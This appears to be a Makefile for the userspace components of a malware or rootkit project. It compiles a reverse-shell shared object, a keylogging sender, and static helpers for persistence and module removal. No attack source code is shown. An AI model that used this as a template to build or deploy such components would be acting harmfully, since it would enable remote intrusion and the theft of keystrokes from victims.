# TODO: Strip all binaries
CC = gcc
CFLAGS = -Wall -O2 -DDEBUG
STATIC_CFLAGS = -Wall -O2 -static -DDEBUG

BUILD_DIR = build

HELPER_SRCS = persistency.c persistency_remove.c receiver_helper.c remove_module.c
HELPER_BINS = $(patsubst %.c,$(BUILD_DIR)/%,$(HELPER_SRCS))

all: $(BUILD_DIR) $(BUILD_DIR)/reverse_shell.so $(BUILD_DIR)/keylog_sender.so $(HELPER_BINS)

$(BUILD_DIR):
	mkdir -p $@

# Build shared object in src/userspace/build
$(BUILD_DIR)/reverse_shell.so: reverse_shell.c | $(BUILD_DIR)
	$(CC) -fPIC -shared -o $@ $<

# Build shared object in src/userspace/build
$(BUILD_DIR)/keylog_sender.so: keylog_sender.c | $(BUILD_DIR)
	$(CC) -fPIC -shared -o $@ $<

# Build each helper as a statically linked executable in src/userspace/build
$(BUILD_DIR)/%: %.c | $(BUILD_DIR)
	$(CC) $(STATIC_CFLAGS) -o $@ $<

clean:
	rm -rf $(BUILD_DIR)
